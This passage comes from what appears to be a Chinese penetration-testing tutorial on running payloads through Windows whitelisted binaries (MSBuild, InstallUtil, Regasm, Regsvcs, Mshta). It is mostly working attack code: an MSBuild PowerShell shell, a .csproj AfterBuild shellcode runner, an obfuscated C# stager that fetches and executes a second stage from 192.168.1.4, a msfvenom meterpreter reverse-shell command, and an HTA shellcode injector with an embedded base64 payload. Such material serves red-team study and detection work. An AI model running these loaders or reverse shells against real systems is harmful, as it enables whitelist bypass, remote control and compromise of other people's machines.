]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">  &lt;&#x2F;UsingTask&gt;</span><br><span class="line">&lt;&#x2F;Project&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>executes PowerShellCommands.xml</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Project ToolsVersion&#x3D;&quot;4.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;developer&#x2F;msbuild&#x2F;2003&quot;&gt;</span><br><span class="line">  &lt;!-- This inline task executes c# code. --&gt;</span><br><span class="line">  &lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml --&gt;</span><br><span class="line">   &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span><br><span class="line">  &lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line">  &lt;Target Name&#x3D;&quot;Hello&quot;&gt;</span><br><span class="line">   &lt;FragmentExample &#x2F;&gt;</span><br><span class="line">   &lt;ClassExample &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;FragmentExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;ParameterGroup&#x2F;&gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">      &lt;Using Namespace&#x3D;&quot;System&quot; &#x2F;&gt;</span><br><span class="line">	  &lt;Using Namespace&#x3D;&quot;System.IO&quot; &#x2F;&gt;</span><br><span class="line">      &lt;Code Type&#x3D;&quot;Fragment&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">			    Console.WriteLine(&quot;Hello From Fragment&quot;);</span><br><span class="line">        ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">	&lt;&#x2F;UsingTask&gt;</span><br><span class="line">	&lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">	&lt;Task&gt;</span><br><span class="line">	  &lt;Reference Include&#x3D;&quot;System.Management.Automation&quot; &#x2F;&gt;</span><br><span class="line">      &lt;Code Type&#x3D;&quot;Class&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">		</span><br><span class="line">			using System;</span><br><span class="line">			using System.IO;</span><br><span class="line">			using System.Diagnostics;</span><br><span class="line">			using System.Reflection;</span><br><span class="line">			using System.Runtime.InteropServices;</span><br><span class="line">			&#x2F;&#x2F;Add For PowerShell Invocation</span><br><span class="line">			using System.Collections.ObjectModel;</span><br><span class="line">			using System.Management.Automation;</span><br><span class="line">			using System.Management.Automation.Runspaces;</span><br><span class="line">			using System.Text;</span><br><span class="line">			using Microsoft.Build.Framework;</span><br><span class="line">			using Microsoft.Build.Utilities;</span><br><span class="line">							</span><br><span class="line">			public class ClassExample :  Task, ITask</span><br><span class="line">			&#123;</span><br><span class="line">				public override bool Execute()</span><br><span class="line">				&#123;</span><br><span class="line">					</span><br><span class="line">					while(true)</span><br><span class="line">					&#123;</span><br><span class="line">						</span><br><span class="line">						Console.Write(&quot;PS &gt;&quot;);</span><br><span class="line">						string x &#x3D; Console.ReadLine();</span><br><span class="line">						try</span><br><span class="line">						&#123;</span><br><span class="line">							Console.WriteLine(RunPSCommand(x));</span><br><span class="line">						&#125;</span><br><span class="line">						catch (Exception e)</span><br><span class="line">						&#123;</span><br><span class="line">							Console.WriteLine(e.Message);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">								return true;</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				&#x2F;&#x2F;Based on Jared Atkinson&#39;s And Justin Warner&#39;s Work</span><br><span class="line">				public static string RunPSCommand(string cmd)</span><br><span class="line">				&#123;</span><br><span class="line">					&#x2F;&#x2F;Init stuff</span><br><span class="line">					Runspace runspace &#x3D; RunspaceFactory.CreateRunspace();</span><br><span class="line">					runspace.Open();</span><br><span class="line">					RunspaceInvoke scriptInvoker &#x3D; new RunspaceInvoke(runspace);</span><br><span class="line">					Pipeline pipeline &#x3D; runspace.CreatePipeline();</span><br><span class="line">					&#x2F;&#x2F;Add commands</span><br><span class="line">					pipeline.Commands.AddScript(cmd);</span><br><span class="line">					&#x2F;&#x2F;Prep PS for string output and invoke</span><br><span class="line">					pipeline.Commands.Add(&quot;Out-String&quot;);</span><br><span class="line">					Collection&lt;PSObject&gt; results &#x3D; pipeline.Invoke();</span><br><span class="line">					runspace.Close();</span><br><span class="line">					&#x2F;&#x2F;Convert records to strings</span><br><span class="line">					StringBuilder stringBuilder &#x3D; new StringBuilder();</span><br><span class="line">					foreach (PSObject obj in results)</span><br><span class="line">					&#123;</span><br><span class="line">						stringBuilder.Append(obj);</span><br><span class="line">					&#125;</span><br><span class="line">					return stringBuilder.ToString().Trim();</span><br><span class="line">				 &#125;</span><br><span class="line">				 </span><br><span class="line">				 public static void RunPSFile(string script)</span><br><span class="line">				&#123;</span><br><span class="line">					PowerShell ps &#x3D; PowerShell.Create();</span><br><span class="line">					ps.AddScript(script).Invoke();</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line"> </span><br><span class="line">			</span><br><span class="line">        ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">  &lt;&#x2F;UsingTask&gt;</span><br><span class="line">&lt;&#x2F;Project&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>executes shellcode when visual studio is afterBuild.csproj</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- This inline task executes shellcode when visual studio is afterbuild. --&gt;</span><br><span class="line">&lt;!-- Add the following code into the .csproj file --&gt;</span><br><span class="line">&lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line"></span><br><span class="line">&lt;Target Name&#x3D;&quot;AfterBuild&quot;&gt;</span><br><span class="line">    &lt;ClassExample &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">    </span><br><span class="line">      &lt;Code Type&#x3D;&quot;Class&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">        using System;</span><br><span class="line">        using System.Runtime.InteropServices;</span><br><span class="line">        using Microsoft.Build.Framework;</span><br><span class="line">        using Microsoft.Build.Utilities;</span><br><span class="line">        public class ClassExample :  Task, ITask</span><br><span class="line">        &#123;         </span><br><span class="line">          private static UInt32 MEM_COMMIT &#x3D; 0x1000;          </span><br><span class="line">          private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern IntPtr CreateThread(            </span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId           </span><br><span class="line">            );</span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );          </span><br><span class="line">          public override bool Execute()</span><br><span class="line">          &#123;</span><br><span class="line">            byte[] shellcode &#x3D; new byte[195] &#123;</span><br><span class="line">              0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,</span><br><span class="line">              0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,</span><br><span class="line">              0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,</span><br><span class="line">              0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,</span><br><span class="line">              0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,</span><br><span class="line">              0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,</span><br><span class="line">              0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,</span><br><span class="line">              0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,</span><br><span class="line">              0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,</span><br><span class="line">              0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,</span><br><span class="line">              0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,</span><br><span class="line">              0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,</span><br><span class="line">              0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 &#125;;</span><br><span class="line">              </span><br><span class="line">              UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">              IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">              UInt32 threadId &#x3D; 0;</span><br><span class="line">              IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line">              hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">              WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">              return true;</span><br><span class="line">          &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">  &lt;&#x2F;UsingTask&gt;</span><br></pre></td></tr></table></figure>
<h2 id="72-基于白名单Installutil-exe执行payload第二季"><a href="#72-基于白名单Installutil-exe执行payload第二季" class="headerlink" title="72. 基于白名单Installutil.exe执行payload第二季"></a>72. 基于白名单Installutil.exe执行payload第二季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机编译</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;r:System.Ente rpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;out:Micropoor.exe &#x2F;keyfile:C:\Users\John\Desktop\installutil.snk &#x2F;unsafe C:\Users\John\Desktop\installutil.cs</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U Micropoor.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>附录：Micropoor.cs</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Net; </span><br><span class="line">using System.Linq; </span><br><span class="line">using System.Net.Sockets; </span><br><span class="line">using System.Runtime.InteropServices; </span><br><span class="line">using System.Threading; </span><br><span class="line">using System.Configuration.Install; </span><br><span class="line">using System.Windows.Forms;</span><br><span class="line"></span><br><span class="line">public class GQLBigHgUniLuVx &#123;</span><br><span class="line">	public static void Main()</span><br><span class="line">	&#123;</span><br><span class="line">		while(true)</span><br><span class="line">		&#123;&#123; MessageBox.Show(&quot;doge&quot;); Console.ReadLine();&#125;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">[System.ComponentModel.RunInstaller(true)]</span><br><span class="line"></span><br><span class="line">public class esxWUYUTWShqW : System.Configuration.Install.Installer</span><br><span class="line">&#123;</span><br><span class="line">	public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)</span><br><span class="line">	&#123;</span><br><span class="line">		jkmhGrfzsKQeCG.LCIUtRN();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class jkmhGrfzsKQeCG</span><br><span class="line">&#123;</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);</span><br><span class="line">	static byte[] ErlgHH(string ZwznjBJY, int KsMEeo) </span><br><span class="line">	&#123;</span><br><span class="line">		IPEndPoint qAmSXHOKCbGlysd &#x3D; new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);</span><br><span class="line">		Socket XXxIoIXNCle &#x3D; new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">		try </span><br><span class="line">		&#123; </span><br><span class="line">			XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); </span><br><span class="line">		&#125;</span><br><span class="line">		catch &#123; return null;&#125;</span><br><span class="line">		byte[] UmquAHRnhhpuE &#x3D; new byte[4];</span><br><span class="line">		XXxIoIXNCle.Receive(UmquAHRnhhpuE, 4, 0);</span><br><span class="line">		int kFVRSNnpj &#x3D; BitConverter.ToInt32(UmquAHRnhhpuE, 0);</span><br><span class="line">		byte[] qaYyFq &#x3D; new byte[kFVRSNnpj + 5];</span><br><span class="line">		</span><br><span class="line">		int SRCDELibA &#x3D; 0;</span><br><span class="line">		while (SRCDELibA &lt; kFVRSNnpj)</span><br><span class="line">		&#123; SRCDELibA +&#x3D; XXxIoIXNCle.Receive(qaYyFq, SRCDELibA + 5, (kFVRSNnpj - SRCDELibA) &lt; 4096 ? (kFVRSNnpj - SRCDELibA) : 4096, 0);&#125;</span><br><span class="line">		byte[] TvvzOgPLqwcFFv &#x3D; BitConverter.GetBytes((int)XXxIoIXNCle.Handle);</span><br><span class="line">		Array.Copy(TvvzOgPLqwcFFv, 0, qaYyFq, 1, 4); qaYyFq[0] &#x3D; 0xBF;</span><br><span class="line">		return qaYyFq;</span><br><span class="line">	&#125;</span><br><span class="line">	static void cmMtjerv(byte[] HEHUjJhkrNS)</span><br><span class="line">	&#123;</span><br><span class="line">		if (HEHUjJhkrNS !&#x3D; null)</span><br><span class="line">		&#123;</span><br><span class="line">			UInt32 WcpKfU &#x3D; VirtualAlloc(0, (UInt32)HEHUjJhkrNS.Length, 0x1000, 0x40);</span><br><span class="line">			Marshal.Copy(HEHUjJhkrNS, 0, (IntPtr)(WcpKfU), HEHUjJhkrNS.Length);</span><br><span class="line">			IntPtr UhxtIFnlOQatrk &#x3D; IntPtr.Zero;</span><br><span class="line">			UInt32 wdjYKFDCCf &#x3D; 0; </span><br><span class="line">			IntPtr XVYcQxpp &#x3D; IntPtr.Zero;</span><br><span class="line">			UhxtIFnlOQatrk &#x3D; CreateThread(0, 0, WcpKfU, XVYcQxpp, 0, ref wdjYKFDCCf);</span><br><span class="line">			WaitForSingleObject(UhxtIFnlOQatrk, 0xFFFFFFFF); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void LCIUtRN()</span><br><span class="line">	&#123;</span><br><span class="line">		byte[] IBtCWU &#x3D; null; IBtCWU &#x3D; ErlgHH(&quot;192.168.1.4&quot;, 53);</span><br><span class="line">		cmMtjerv(IBtCWU);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="73-基于白名单Regasm-exe执行payload第三季"><a href="#73-基于白名单Regasm-exe执行payload第三季" class="headerlink" title="73. 基于白名单Regasm.exe执行payload第三季"></a>73. 基于白名单Regasm.exe执行payload第三季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe &#x2F;U Micropoor.dll</span><br></pre></td></tr></table></figure>
<h2 id="74-基于白名单Regsvcs-exe执行payload第四季"><a href="#74-基于白名单Regsvcs-exe执行payload第四季" class="headerlink" title="74. 基于白名单Regsvcs.exe执行payload第四季"></a>74. 基于白名单Regsvcs.exe执行payload第四季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Micropoor.dll</span><br></pre></td></tr></table></figure>
<h2 id="75-基于白名单Mshta-exe执行payload第五季"><a href="#75-基于白名单Mshta-exe执行payload第五季" class="headerlink" title="75. 基于白名单Mshta.exe执行payload第五季"></a>75. 基于白名单Mshta.exe执行payload第五季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\mshta.exe</span><br><span class="line">C:\Windows\SysWOW64\mshta.exe</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>配置payload</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐a x86 ‐‐platform windows ‐p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.16 8.1.4 LPORT&#x3D;53 ‐f raw &gt; shellcode.bin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat shellcode.bin |base64 ‐w 0</span><br><span class="line">&#x2F;&#x2F; 替换Hta中Dim code : code部分</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>靶机执行</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor.hta</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor.hta</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">&#39;                                (              )  (            )  </span><br><span class="line">&#39;   (    (       (    *   )      )\ )  *   ) ( &#x2F;(  )\ )  (   ( &#x2F;(  </span><br><span class="line">&#39;   )\   )\      )\ &#96; )  &#x2F;(   ( (()&#x2F;(&#96; )  &#x2F;( )\())(()&#x2F;(  )\  )\()) </span><br><span class="line">&#39; (((_|(((_)(  (((_) ( )(_))  )\ &#x2F;(_))( )(_)|(_)\  &#x2F;(_)|((_)((_)\  </span><br><span class="line">&#39; )\___)\ _ )\ )\___(_(_())_ ((_|_)) (_(_())  ((_)(_)) )\___ _((_) </span><br><span class="line">&#39;((&#x2F; __(_)_\(_|(&#x2F; __|_   _| | | &#x2F; __||_   _| &#x2F; _ \| _ ((&#x2F; __| || | </span><br><span class="line">&#39; | (__ &#x2F; _ \  | (__  | | | |_| \__ \  | |  | (_) |   &#x2F;| (__| __ | </span><br><span class="line">&#39;  \___&#x2F;_&#x2F; \_\  \___| |_|  \___&#x2F;|___&#x2F;  |_|   \___&#x2F;|_|_\ \___|_||_| </span><br><span class="line">&#39;                                                                 </span><br><span class="line">&#39; Author: Vincent Yiu (@vysecurity)</span><br><span class="line">&#39; Credits:</span><br><span class="line">&#39;   - @cn33liz: Inspiration with StarFighter</span><br><span class="line">&#39;   - @tiraniddo: James Forshaw for DotNet2JScript</span><br><span class="line">&#39;   - @armitagehacker: Raphael Mudge for idea of selecting 32 bit version on 64 bit architecture machines for injection into</span><br><span class="line"></span><br><span class="line">&#39; A HTA shellcode launcher. This will spawn a 32 bit version of the binary specified and inject shellcode into it.</span><br><span class="line"></span><br><span class="line">&#39; Usage:</span><br><span class="line">&#39; Choose a binary you want to inject into, default &quot;rundll32.exe&quot;, you can use notepad.exe, calc.exe for example...</span><br><span class="line">&#39; Generate a 32 bit raw shellcode in whatever framework you want. Tested: Cobalt Strike, Metasploit Framework</span><br><span class="line">&#39; Run: cat payload.bin | base64 -w 0</span><br><span class="line">&#39; Copy the base64 encoded payload into the code variable below.</span><br><span class="line"></span><br><span class="line">&#39; Replace with binary name that you want to inject into. This can be anything that exists both in SYSWOW64 and SYSTEM32</span><br><span class="line">Dim binary : binary &#x3D; &quot;rundll32.exe&quot;</span><br><span class="line"></span><br><span class="line">&#39; Base64 encoded 32 bit shellcode</span><br><span class="line">Dim code : code &#x3D; &quot;TVroAAAAAFtSRVWJ5YHDcoAAAP&#x2F;TicNXaAQAAABQ&#x2F;9Bo8LWiVmgFAAAAUP&#x2F;TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA&quot;</span><br><span class="line"></span><br><span class="line">&#39; ---------- DO NOT EDIT BELOW HERE -----------</span><br><span class="line"></span><br><span class="line">Sub Debug(s)</span><br><span class="line">End Sub</span><br><span class="line">Sub SetVersion</span><br><span class="line">End Sub</span><br><span class="line">Function Base64ToStream(b)</span><br><span class="line">  Dim enc, length, ba, transform, ms</span><br><span class="line">  Set enc &#x3D; CreateObject(&quot;System.Text.ASCIIEncoding&quot;)</span><br><span class="line">  length &#x3D; enc.GetByteCount_2(b)</span><br><span class="line">  Set transform &#x3D; CreateObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;)</span><br><span class="line">  Set ms &#x3D; CreateObject(&quot;System.IO.MemoryStream&quot;)</span><br><span class="line">  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length &#x2F; 4) * 3)</span><br><span class="line">  ms.Position &#x3D; 0</span><br><span class="line">  Set Base64ToStream &#x3D; ms</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Sub Run</span><br><span class="line">Dim s, entry_class</span><br><span class="line">s &#x3D; &quot;AAEAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;</span><br><span class="line">s &#x3D; s &amp; 